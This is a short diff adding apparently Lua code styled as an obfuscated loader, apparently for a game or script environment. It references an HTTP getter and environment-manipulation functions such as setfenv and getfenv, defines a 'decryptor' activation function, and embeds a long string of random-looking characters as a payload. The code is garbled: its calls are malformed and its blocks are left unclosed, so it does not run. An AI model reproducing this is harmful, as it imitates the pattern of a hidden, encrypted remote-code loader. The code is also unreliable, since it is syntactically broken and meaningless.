@@ -1,0 +1,14 @@
+require({"Activity"},"states")
+local e = require({"httpGet"},{"http",
+local luacode = [[
+    local function dec()
+      setmetatable,getmetatable,setfenv,getfenv,string.byte
+end
+    ]]
+local activate = e
+    activate=function(decryptor)
+
+local flrx_customcode = [[
+..state1on.. , ..state2off.. , ..state3on.. , ..state4off..
+eCYNEdy^T&DN#N&GD37D^g7n3d&^#d7gnt37gD^NG^G&^#D^&N#ECN&#VX&V#&NGBC&M#RCTYEC'c.r.c.c.fr.c.fr.c..c.rc.r.cf.rc.fc.f..f.fc.rf.r..cf.c.rf.rfc.rf.c.rcf.rf.c.rfc..rcf.r...rfc.'CdjedbeyrnECbetGUD
+]]
